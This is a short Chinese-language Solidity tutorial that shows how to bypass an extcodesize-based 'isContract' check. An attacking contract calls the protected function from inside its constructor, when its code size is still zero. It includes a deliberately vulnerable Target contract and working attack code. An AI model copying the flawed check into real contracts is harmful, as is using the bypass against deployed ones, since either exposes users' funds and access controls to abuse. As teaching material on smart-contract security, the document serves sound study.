# 绕过extcodesize

## 弱点

如果一个地址是一个合约，那么存储在该地址的代码大小将大于0，对吗？

让我们看看如何创建一个代码大小为0、由extcodesize返回的合约。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract Target {
    function isContract(address account) public view returns (bool) {
    // 这个方法依赖于 extcodesize，它在合约构造过程中会返回0，
    // 因为代码仅在构造函数执行结束时才被存储。
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    bool public pwned = false;

    function protected() external {
        require(!isContract(msg.sender), "no contract allowed");
        pwned = true;
    }
}

contract FailedAttack {
    // 尝试调用 Target.protected 会失败，
    // 因为 Target 阻止了合约调用
    function pwn(address _target) external {
        // 这将会失败
        Target(_target).protected();
    }
}

contract Hack {
    bool public isContract;
    address public addr;

    // 当合约正在被创建时，代码大小 (extcodesize) 为 0。
    // 这将绕过 isContract() 检查
    constructor(address _target) {
        isContract = Target(_target).isContract(address(this));
        addr = address(this);
        // 这将正常工作
        Target(_target).protected();
    }
}

```

